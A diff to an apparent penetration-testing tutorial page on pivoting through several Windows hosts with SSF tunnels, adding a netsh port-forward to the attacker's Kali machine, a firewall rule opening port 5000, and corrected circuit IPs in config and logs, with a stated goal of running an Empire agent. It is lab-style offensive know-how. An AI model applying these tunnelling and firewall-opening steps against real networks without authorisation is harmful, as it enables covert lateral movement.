@@ -35,7 +35,7 @@
                     <p class="justify">My solution to solve multiple hop using <a href="https://securesocketfunneling.github.io/ssf/#home">SSF</a>. First we start with three servers, imagine we want to reach the Server 3 (192.168.152.102) from our Kali (192.168.133.156). We need to setup a socks tunnel between Server 2 and our kali. We also want to execute an Empire agent on Server 2. Let's solve this situation !</p>
                     <div style="text-align: center;"><img src="sdfsdf.png" alt="" class="centered"></div><br>
     
-                    <p><b>Note</b>: You need to have local administrator privilege on server 1 in order to allow connection on port 5000.</p>
+                    <p><b>Note</b>: You need to have local administrator privilege on Server 1 in order to allow connection on port 5000 if the firewall is enabled !</p>
     
                     <h4>Creating a remote SOCKS between Server 1 and Kali</h4>
     
@@ -127,7 +127,7 @@
     [2021-03-02T02:23:25-08:00] [info] [ssfd] listening on <*:5000>
     [2021-03-02T02:23:25-08:00] [info] [ssfd] running (Ctrl + C to stop)
     </pre>
-            <p>And then you need to allow connection to the port 5000 by adding this firewall rules:</p>
+            <p>And then you need to allow connection to the port 5000 by adding this firewall rules if the firewall is enabled. You can argue on the fact that we can simple use the netsh command and port forward the port 1338 from Server 1 to ou Kali, while this solution is more simple, you will always need administrative privileges even if the firewall is disabled. In our case, if the firewall is disabled we don't need administrative privileges. In any case you can also use the following command <code>netsh interface portproxy add v4tov4 listenport=1338 listenaddress=0.0.0.0 connectport=1338 connectaddress=192.168.133.156</code> and just reproduce the step 1 on Server 2.</p>
     
     <pre style="font-size:11px; background: #ffd9d9;">
     C:\Windows\system32>netsh advfirewall firewall add rule name="TCP Port 5000" dir=in action=allow protocol=TCP localport=5000
@@ -140,7 +140,7 @@
     {
         "ssf": {
             "circuit": [
-            {"host": "192.168.151.102", "port":"5000"}
+            {"host": "192.168.151.101", "port":"5000"}
             ]
         }
     }
@@ -154,7 +154,7 @@
     [2021-03-02T06:08:04-08:00] [info] [config] [tls] cipher suite: <DHE-RSA-AES256-GCM-SHA384>
     [2021-03-02T06:08:04-08:00] [info] [config] [http proxy] <None>
     [2021-03-02T06:08:04-08:00] [info] [config] [socks proxy] <None>
-    [2021-03-02T06:08:04-08:00] [info] [config] [circuit] 1. <192.168.151.102:5000>
+    [2021-03-02T06:08:04-08:00] [info] [config] [circuit] 1. <192.168.151.101:5000>
     [2021-03-02T06:08:04-08:00] [info] [ssf] connecting to <192.168.133.156:1338>
     [2021-03-02T06:08:04-08:00] [info] [ssf] running (Ctrl + C to stop)
     [2021-03-02T06:08:04-08:00] [info] [client] connection attempt 1/1
@@ -240,7 +240,7 @@
     [2021-03-02T06:36:22-08:00] [info] [config] [tls] cipher suite: <DHE-RSA-AES256-GCM-SHA384>
     [2021-03-02T06:36:22-08:00] [info] [config] [http proxy] <None>
     [2021-03-02T06:36:22-08:00] [info] [config] [socks proxy] <None>
-    [2021-03-02T06:36:22-08:00] [info] [config] [circuit] 1. <192.168.151.102:5000>
+    [2021-03-02T06:36:22-08:00] [info] [config] [circuit] 1. <192.168.151.101:5000>
     [2021-03-02T06:36:22-08:00] [info] [ssf] connecting to <192.168.133.156:1338>
     [2021-03-02T06:36:22-08:00] [info] [ssf] running (Ctrl + C to stop)
     [2021-03-02T06:36:22-08:00] [info] [client] connection attempt 1/1
